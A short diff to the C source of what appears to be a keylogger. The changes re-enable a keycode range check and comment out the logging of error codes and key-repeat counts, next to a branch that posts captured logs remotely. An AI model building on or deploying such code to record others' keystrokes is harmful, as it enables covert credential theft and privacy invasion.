@@ -503,12 +503,12 @@ while (!feof(out)){
     inc_size = 0;
     scan_code = event.code;
 
-    /*
+ 
     if (scan_code >= sizeof(char_or_func)) {  // keycode out of range, log error
-      inc_size += fprintf(out, "<E-%x>", scan_code);
+      //inc_size += fprintf(out, "<E-%x>", scan_code);
       if (inc_size > 0) file_size += inc_size;
       continue;
-    }*/
+    }
     
     // if remote posting is enabled and size treshold is reached
     if (args.post_size != 0 && file_size >= args.post_size && stat(UPLOADER_PID_FILE, &st) == -1) {
@@ -558,7 +558,7 @@ while (!feof(out)){
           prev_code == KEY_LEFTSHIFT  || prev_code == KEY_RIGHTCTRL);  // if repeated key is modifier, do nothing
       else {
         if ((args.flags & FLAG_NO_FUNC_KEYS) && is_func_key(prev_code));  // if repeated was function key, and if we don't log function keys, then don't log repeat either
-        else inc_size += fprintf(out, "<#+%d>", count_repeats);
+        //else inc_size += fprintf(out, "<#+%d>", count_repeats);
       }
       count_repeats = 0;  // reset count for future use
     }
